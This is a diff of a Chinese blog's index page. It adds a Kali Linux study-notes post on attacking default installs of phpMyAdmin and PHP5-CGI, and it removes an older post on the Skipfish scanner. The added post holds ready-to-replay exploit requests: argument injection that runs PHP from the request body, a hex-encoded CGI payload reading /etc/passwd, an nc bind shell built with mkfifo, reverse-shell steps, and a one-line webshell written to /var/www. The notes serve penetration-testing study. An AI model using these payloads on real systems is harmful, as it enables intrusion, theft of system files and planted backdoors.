@@ -240,6 +240,246 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/" itemprop="url">Kali Linux笔记(四十四)：手动漏洞挖掘--默认安装存在漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
+                2020-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  762 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-问答"><a href="#1-问答" class="headerlink" title="1. 问答"></a>1. 问答</h4><ul>
+<li>Conky（性能监测工具）<ul>
+<li><a href="https://weather.yahoo.com/（城市代码）" target="_blank" rel="noopener">https://weather.yahoo.com/（城市代码）</a></li>
+<li>.conkyrc（Beijing：2151330）</li>
+</ul>
+</li>
+<li>Goagent<ul>
+<li>不要启动多次</li>
+<li>Win+M</li>
+</ul>
+</li>
+<li>Linux4.4内核发布，在虚拟机中可使用主机上的GPU</li>
+</ul>
+<h4 id="2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功"><a href="#2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功" class="headerlink" title="2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功"></a>2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功</h4><ul>
+<li>Windows默认安装漏洞</li>
+<li>phpMyAdmin/setup（可以不需要账号密码直接访问）</li>
+<li>Ubuntu/Debian默认安装PHP5-cgi（php位于/usr/bin目录下）</li>
+<li>可直接访问/cgi-bin/php5和/cgi-bin/php（爬不出来的目录）</li>
+</ul>
+<blockquote>
+<pre><code>⭐phpMyAdmin → 通过Burpsuite进行重放（正向）：
+POST http://ip地址/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host:ip地址
+
+&lt;?php 
+passthru(&quot;id/ls/echo &quot;adadsadas&quot; &gt;&gt; a.php&quot;);
+die();
+?&gt;
+
+⭐PHP5-cgi → 通过Burpsuite进行重放（正向）：
+POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
+Host：123
+
+&lt;?php
+    echo system(&apos;cat /etc/passwd&apos;);
+?&gt;
+▲ exec()函数执行命令时，如&apos;cat /etc/passwd&apos; 只返回最后一行的内容
+▲ host无作用，但因为请求头需要host
+
+⭐PHP5-cgi → 通过Burpsuite进行重放（网页主动打开一个侦听端口）：
+POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
+Host：123
+
+&lt;?php
+    echo system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);
+?&gt;</code></pre></blockquote>
+<h4 id="3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell"><a href="#3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell" class="headerlink" title="3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell"></a>3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell</h4><ul>
+<li>PHP反弹shell<ul>
+<li><strong><code>🔺命令：cp  /usr/share/webshells/php/php-reverse-shell.php ./3.php</code></strong></li>
+<li><strong><code>🔺命令：vi 3.php</code></strong></li>
+<li>修改反弹Shell的ip</li>
+<li>3.php的内容加在POST中的body部分</li>
+<li>nc 侦听端口</li>
+<li>发送POST信息到phpMyAdmin上</li>
+<li>获得Shell</li>
+</ul>
+</li>
+<li>File</li>
+<li>Whereis<ul>
+<li>ifconfig</li>
+</ul>
+</li>
+<li>写入WebShell<ul>
+<li><strong><code>🔺命令：echo &quot;&lt;?php \$cmd=\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt; /var/www/2.php</code></strong>（\用于避免$后面的变量过滤）</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2897,233 +3137,6 @@ Test Links In URLs（Bookmark Test）：只测试连接
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B9%9D)%EF%BC%9ASkipfish/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B9%9D)%EF%BC%9ASkipfish/" itemprop="url">Kali Linux笔记(三十九)：Skipfish</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
-                2019-12-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  427 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-skipfish"><a href="#1-skipfish" class="headerlink" title="1. skipfish"></a>1. skipfish</h4><ul>
-<li>C语言编写（Google开发）</li>
-<li>实验性的主动web安全评估工具（相比于商业扫描器不遑相让）</li>
-<li>基于Web Application进行扫描</li>
-<li>递归爬网</li>
-<li>基于字典的探测</li>
-<li>速度较快<ul>
-<li>多路单线程，全异步网络I/O，消除内存管理和调度开销</li>
-<li>启发式自动内容识别</li>
-</ul>
-</li>
-<li>误报较低</li>
-</ul>
-<h4 id="2-skipfish"><a href="#2-skipfish" class="headerlink" title="2. skipfish"></a>2. skipfish</h4><ul>
-<li><strong><code>🔺命令：skipfish -o（存放工作目录） test http://1.1.1.1</code></strong></li>
-<li><strong><code>🔺命令：skipfish -o test @url.txt</code></strong></li>
-<li><strong><code>🔺命令：skipfish -o test -S（指定只读字典）complet.wl -W（写成新的字典） a.wl http://1.1.1.1  #字典</code></strong></li>
-<li>参数<ul>
-<li>-I：只检查包含’string’的URL</li>
-<li>-X：不检查包含’string’的URL  #logout</li>
-<li>-K：不对指定参数进行Fuzz测试</li>
-<li>-D：跨站点爬取另外一个域（有连接则会跳过去爬取 ）</li>
-<li>-l：每秒最大请求数</li>
-<li>-m：每IP最大并发连接数</li>
-<li>–config：指定配置文件</li>
-</ul>
-</li>
-<li>身份认证（http认证）<ul>
-<li><strong><code>🔺命令：skipfish -A（http身份认证信息） user:pass -o test http://1.1.1.1</code></strong></li>
-</ul>
-</li>
-<li>身份认证（Cookie认证）    <ul>
-<li><strong><code>🔺命令：skipfish -C（Cookie信息）&quot;name=var&quot; -o test http://1.1.1.1</code></strong></li>
-</ul>
-</li>
-<li>身份认证参数（表单认证） <ul>
-<li>–auth-form <URL> </li>
-<li>–auth-user-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
-<li>–auth-user <username> （提交表单的用户名）</li>
-<li>–auth-pass-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
-<li>–auth-pass <password>  （提交表单的密码）</li>
-<li>–auth-verify-url <URL> （提交成功后显示的界面）</li>
-<li>–auth-form-target <URL>（通过form里面的action确定）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>表单代码名可通过查看界面源代码元素去获得，查看表单设置的属性</code></pre></blockquote>
-<ul>
-<li>扫描结束太快<ul>
-<li>触发了目标站点的连接数限制，降低-m -l数值</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3178,7 +3191,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">142</span>
+                  <span class="site-state-item-count">143</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3189,7 +3202,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -3200,7 +3213,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -3285,7 +3298,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">126.1k</span>
+    <span title="Site words total count">128.1k</span>
   
 </div>
 
